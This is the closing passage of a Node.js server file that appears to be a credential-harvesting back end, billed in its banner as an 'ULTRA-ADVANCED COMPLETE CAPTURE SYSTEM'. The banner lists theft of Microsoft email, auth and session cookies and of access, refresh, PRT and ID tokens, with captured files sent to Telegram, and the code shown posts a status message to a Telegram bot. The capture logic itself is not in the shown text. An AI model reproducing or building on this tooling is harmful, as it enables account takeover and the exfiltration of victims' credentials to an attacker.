  console.log('⚡ ULTRA-ADVANCED COMPLETE CAPTURE SYSTEM v4.0');
  console.log('='.repeat(80));
  console.log(`📡 Port: ${config.server.port}`);
  console.log(`🌐 URL: ${config.server.appUrl}`);
  console.log(`💾 Storage: ${config.storage.dataDir}`);
  console.log('='.repeat(80));
  console.log('\n🚀 FEATURES:');
  console.log('   ✅ NO TRUNCATION - Complete tokens captured');
  console.log('   ✅ TXT Reports - Full detailed reports');
  console.log('   ✅ All Microsoft Cookies - Email, Auth, Session');
  console.log('   ✅ Files Sent to Telegram - TXT + JSON');
  console.log('   ✅ Access + Refresh + PRT + ID Tokens');
  console.log('   ✅ Multi-part messages if needed');
  console.log('   ✅ Persistent storage (JSON + TXT)');
  console.log('='.repeat(80) + '\n');

  if (config.telegram.botToken) {
    await TelegramSender.sendJSON('⚡ *SYSTEM ONLINE v4.0*', {
      status: 'operational',
      version: '4.0-COMPLETE',
      features: {
        noTruncation: true,
        txtReports: true,
        allCookies: true,
        fileUploads: true,
      },
    });
  }
});

module.exports = app;
